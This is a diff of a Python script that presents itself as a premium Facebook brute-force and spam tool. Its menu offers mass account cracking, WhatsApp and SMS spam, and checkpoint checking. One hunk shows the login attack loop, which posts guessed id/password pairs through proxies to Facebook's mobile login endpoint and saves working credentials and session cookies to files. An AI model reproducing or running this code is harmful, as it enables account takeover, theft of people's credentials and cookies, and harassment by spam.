@@ -1,4 +1,4 @@
-#-----------------[ IMPORT-MODULE ]-------------------
+#-----------------[ IMPORT - PREMIUM ]-------------------
 import requests,bs4,json,os,sys,random,datetime,time,re
 import urllib3,rich,base64
 from rich.table import Table as me
@@ -306,7 +306,7 @@ def menu(my_name,my_id):
 	ip = requests.get("https://api.ipify.org").text
 	cetak(panel(f'[bold white]Terima Kasih Kepada [bold green]BintangTzy[bold white] Yang Telah Recode Script Ini, Premium Multi Brute Facebook',width=90,style=f"bold white"))
 	cetak(panel(f'[bold white][[bold green]•[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Ip  : [bold green]{ip}[/][/][bold white]\n[[bold green]•[/][bold white]][/] [bold white]Status   : [bold green]Premium ',width=90,title=f"[bold green]Infomasi",style=f"bold white"))
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Publick OR Friends [[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Massal [[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack Username [[bold green] ON [bold white]]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Crack File [[bold green] ON [bold white]]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Crack Followers [[bold green] ON [bold white]]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Crack Email [[bold green] ON [bold white]]\n[bold white][[bold green]07[/][bold white]][/] [bold white]Cek Result [[bold green] ON [bold white]][/]\n[bold white][[bold green]08[/][bold white]][/] [bold white]Cek Opsi Chekpoint [[bold green] ON [bold white]]\n[bold white][[bold green]09[/][bold white]][/] [bold white]Spam WhatsApp [[bold green] ON [bold white]]\n[bold white][[bold green]10[/][bold white]][/] [bold white]Spam Sms [[bold green] ON [bold white]]\n[bold white][[bold green]11[/][bold white]][/] [bold white]Report Bug [[bold green] ON [bold white]]\n[bold white][[bold red]00[/][bold white]][/] [bold red]Ganti Cookies [[bold green] ON [bold white]][/]',width=90,title=f"[bold green]List Menu",style=f"bold white"))
+	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Publick OR Friends [[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Massal [[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack Username [[bold green] ON [bold white]]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Crack File [[bold green] ON [bold white]]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Crack Followers [[bold green] ON [bold white]]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Crack Email [[bold green] ON [bold white]]\n[bold white][[bold green]07[/][bold white]][/] [bold white]Cek Hasil Crack [[bold green] ON [bold white]][/]\n[bold white][[bold green]08[/][bold white]][/] [bold white]Cek Opsi Chekpoint [[bold green] ON [bold white]]\n[bold white][[bold green]09[/][bold white]][/] [bold white]Spam WhatsApp [[bold green] ON [bold white]]\n[bold white][[bold green]10[/][bold white]][/] [bold white]Spam Sms [[bold green] ON [bold white]]\n[bold white][[bold green]11[/][bold white]][/] [bold white]Report Bug [[bold green] ON [bold white]]\n[bold white][[bold red]00[/][bold white]][/] [bold red]Ganti Cookies [[bold green] ON [bold white]][/]',width=90,title=f"[bold green]List Menu",style=f"bold white"))
 	cetak(panel(f'[bold Red]Warning[bold white] Gunakan Script Ini Dengan Baik Jangan Di Salah Gunakan [bold green]By XyzonXD',width=90,title=f"[bold green]Informasi Crack",style=f"bold white"))
 	_____brayennn___xd____ = input(f' [+] Pilih Menu Crack : ')
 	if _____brayennn___xd____ in ['1','01']:
@@ -1582,7 +1582,7 @@ def reguler2(idf,pwv):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				tree = Tree(f" ")
-				tree.add(f"[ Checkpoint ]").add(f"[bold yellow]{idf}|{pw}").add(f"[bold yellow]{ua}\n")
+				tree.add(f"[ Checkpoint ]").add(f"[bold yellow]{idf}|{pw}|{thn}").add(f"[bold yellow]{ua}\n")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1593,7 +1593,7 @@ def reguler2(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[ Succes-Login ]").add(f"[bold green]{idf}|{pw}").add(f"[bold green]{kuki}\n")
+				tree.add(f"[ Succes-Login ]").add(f"[bold green]{idf}|{pw}|{thn}").add(f"[bold green]{kuki}\n")
 				cetak(tree)
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(session,coki)
@@ -2161,4 +2161,4 @@ if __name__=='__main__':
 	except:pass
 	try:os.system('clear')
 	except:pass
-	login()
+     login()
